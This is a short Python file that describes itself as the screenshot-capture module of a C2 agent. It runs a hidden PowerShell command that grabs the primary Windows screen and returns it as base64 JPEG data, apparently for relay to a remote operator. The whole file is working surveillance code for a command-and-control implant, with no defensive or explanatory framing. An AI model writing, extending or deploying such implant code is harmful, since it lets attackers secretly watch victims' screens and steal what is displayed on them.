"""C2 Agent - Screenshot Capture"""
import subprocess, base64
def capture_screenshot():
    try:
        ps = (
            'Add-Type -AssemblyName System.Windows.Forms;'
            'Add-Type -AssemblyName System.Drawing;'
            '$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;'
            '$img = New-Object System.Drawing.Bitmap $b.Width, $b.Height;'
            '$g = [System.Drawing.Graphics]::FromImage($img);'
            '$g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size);'
            '$ms = New-Object System.IO.MemoryStream;'
            '$img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg);'
            '$g.Dispose(); $img.Dispose();'
            'Write-Host ([Convert]::ToBase64String($ms.ToArray()));'
            '$ms.Dispose()'
        )
        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, text=True, timeout=30)
        b64 = r.stdout.strip().splitlines()[0]
        if len(b64) > 100:
            return {"output": "[IMG]" + b64 + "[/IMG]", "exit_code": 0}
        return {"output": "Failed: " + (r.stderr or "no image data"), "exit_code": -1}
    except Exception as e:
        return {"output": "[ERROR] " + str(e), "exit_code": -1}
